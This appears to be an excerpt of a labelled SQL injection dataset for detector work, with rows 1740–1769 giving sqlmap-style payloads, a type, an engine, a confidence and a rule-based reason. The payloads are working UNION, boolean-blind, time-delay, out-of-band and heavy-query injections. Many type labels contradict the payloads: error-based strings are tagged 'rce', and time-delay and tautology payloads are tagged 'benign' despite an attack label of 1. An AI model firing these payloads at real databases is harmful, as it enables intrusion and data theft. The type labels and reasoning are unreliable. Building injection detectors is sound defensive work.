row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
1740,"-9929' ) as gbtc where 8162 = 8162 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1741,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and '%' = '",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1742,"1'+ ( select rdpe where 6553 = 6553 or elt ( 6272 = 6272,sleep ( 5 ) ) ) +'",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1743,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'atvu' = 'atvu",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
1744,"-9558"" where 7497 = 7497 or ( 2539 = 6484 ) *6484--",1,,boolean_blind,generic,0.95,7497 = 7497 or detected — boolean_blind injection (priority 8) on generic,rule-based
1745,"-1277"" ) where 6622 = 6622 or 3038 = 3038",1,,boolean_blind,generic,0.95,6622 = 6622 or detected — boolean_blind injection (priority 8) on generic,rule-based
1746,"1"" ) where 1107 = 1107 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
1747,"-1171' union all select 3958,3958,3958,3958,3958--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1748,1 ) ) as quap where 7625 = 7625,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1749,"-7001'+ ( select slav where 9321 = 9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1750,"-3828%"" ) ) ) or make_set ( 1765 = 8657,8657 ) and ( ( ( ""%"" = """,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
1751,1' ) ) as njop where 7001 = 7001,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1752,1' ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( 'ohqs' like 'ohqs,1,,boolean_blind,firebird,0.95,") and (, like ' detected — boolean_blind injection (priority 8) on firebird",rule-based
1753,"1' ) ) and elt ( 4249 = 4249,7259 ) and ( ( 'miir' like 'miir",1,,boolean_blind,generic,0.95,") and (, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
1754,"1%"" and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1755,"1"" where 4633 = 4633 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",1,,boolean_blind,generic,0.95,4633 = 4633 and detected — boolean_blind injection (priority 8) on generic,rule-based
1756,"-1588%"" ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1757,-4615' or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ),1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
1758,( 2329 = 4209 ) *1,1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
1759,"-9725' ) union all select 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1760,"1"" where 1051 = 1051 union all select null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1761,"1"" ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( ""fpkm"" like ""fpkm",1,,boolean_blind,generic,0.95,") and (, like "" detected — boolean_blind injection (priority 8) on generic",rule-based
1762,"1', ( case when 5204 = 2136 then 1 else null end )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1763,"1' ) where 1027 = 1027 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
1764,"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( 'vxqs' = 'vxqs",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
1765,"-2225' union all select 1545,1545,1545,1545#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1766,"1' or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1767,"1%"" ) ) and make_set ( 9897 = 5557,5557 ) and ( ( ""%"" = """,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
1768,"1%' union all select null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1769,-8410' ) ) ) or 8571 = 8571--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
